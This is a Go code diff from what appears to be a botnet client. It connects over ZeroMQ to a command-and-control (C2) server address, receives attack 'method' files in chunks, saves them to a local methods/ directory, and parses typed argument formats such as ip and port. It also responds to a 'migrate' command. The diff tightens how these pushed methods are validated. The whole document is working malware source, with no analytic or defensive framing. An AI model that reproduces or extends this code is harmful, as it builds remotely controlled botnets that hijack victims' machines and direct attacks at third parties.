@@ -2,10 +2,12 @@ package main
 
 import (
 	"bufio"
+	"errors"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -17,14 +19,22 @@ import (
 
 	"time"
 
+	"github.com/fatih/color"
 	zmq "github.com/pebbe/zmq4"
 )
 
 type Method struct {
-	name     string
-	filepath string
-	format   string
+	name         string
+	path         string
+	flag_entries []methflag
+	rawformat    string
 }
+
+type methflag struct {
+	entry     string
+	entrytype string
+}
+
 type postC2info struct {
 	C2ip  string
 	rport string
@@ -50,6 +60,17 @@ var (
 	dealmut        sync.Mutex
 	custom_methods = make([]Method, 0)
 )
+
+func isValidType(t string) bool {
+	validTypes := map[string]bool{
+		"string": true,
+		"ip":     true,
+		"port":   true,
+		"int":    true,
+	}
+
+	return validTypes[t]
+}
 
 func getFreshSocket() (nzmqinst zmqinstance) {
 	log.Println("Getting Fresh Context")
@@ -488,6 +509,49 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 	}
 }
 
+func methodentry(rawformat string) ([]methflag, error) {
+	var flags []methflag
+	seen := make(map[string]bool)
+	ifmain := false
+
+	pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
+	re := regexp.MustCompile(pattern)
+
+	matches := re.FindAllStringSubmatch(rawformat, -1)
+
+	if len(matches) == 0 {
+		return flags, errors.New("there are no entry!!!")
+
+	}
+
+	for _, match := range matches {
+		fmt.Println(match)
+
+		if match[1] == "main" {
+			ifmain = true
+		}
+
+		if seen[match[1]] {
+			color.Red("duplication value detected:%s", match[1])
+			return flags, errors.New(fmt.Sprintf("duplication value detected:%s", match[1]))
+		} else {
+			seen[match[1]] = true
+		}
+
+		if !isValidType(match[2]) {
+			return flags, errors.New(fmt.Sprintf("invalid type '%s' for %s entry", match[2], match[1]))
+		}
+
+		flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
+	}
+
+	if ifmain == false {
+		return flags, errors.New("Format has no main argument")
+	}
+
+	return flags, nil
+}
+
 func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}, submigsignal chan<- struct{}) {
 	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
 
@@ -499,6 +563,7 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 	var file *os.File
 	var methname string
 	var filename string
+	var filepath string
 
 	for {
 		message := ""
@@ -514,50 +579,62 @@ func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown
 			break
 		}
 
-		if len(recved) == 0 {
-			log.Println("empty message ignored")
+		if len(recved) == 0 || len(recved) == 1 {
+			log.Println("malformed message ignored")
 			continue
 		}
 
-		switch recved[1] {
-		case "file_start":
-			methname = recved[2]
-			filename = recved[3]
-			file, err = os.Create("methods/" + filename)
-			if err != nil {
-				log.Printf("failed to create file: %v", err)
-				continue
-			}
-		case "file_chunk":
-			if file != nil && recved[2] == methname {
-				_, err := file.Write([]byte(recved[3]))
+		if len(recved) > 2 {
+			switch recved[1] {
+			case "file_start":
+				methname = recved[2]
+				filename = recved[3]
+				filepath = "methods/" + filename
+				file, err = os.Create(filepath)
+
 				if err != nil {
-					log.Printf("failed to write to file: %v", err)
-					file.Close()
-					file = nil
+					log.Printf("failed to create file: %v", err)
 					continue
 				}
-			}
+			case "file_chunk":
+				if file != nil && recved[2] == methname {
+					_, err := file.Write([]byte(recved[3]))
+					if err != nil {
+						log.Printf("failed to write to file: %v", err)
+						file.Close()
+						file = nil
+						continue
+					}
+				}
 
-		case "file_end":
-			if file != nil && methname == recved[2] {
-				file.Close()
-				file = nil
+			case "file_end":
+				if file != nil && methname == recved[2] {
+					file.Close()
+					file = nil
 
-				var meth Method
+					rawformat := recved[3]
+					fmt.Println(rawformat)
 
-				meth.filepath = "methods/" + filename
-				meth.name = methname
-				meth.format = recved[3]
-				fmt.Println(meth.format)
-				custom_methods = append(custom_methods, meth)
-				methname = ""
-				filename = ""
+					entries, err := methodentry(rawformat)
+
+					if err != nil {
+						log.Println(err)
+						break
+					}
+
+					fmt.Println(Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})
+
+					custom_methods = append(custom_methods, Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})
+					methname = ""
+					filename = ""
+				}
 			}
 		}
 
 		if len(recved) == 2 {
 			message = recved[1]
+		} else {
+			continue
 		}
 
 		if message == "migrate" {
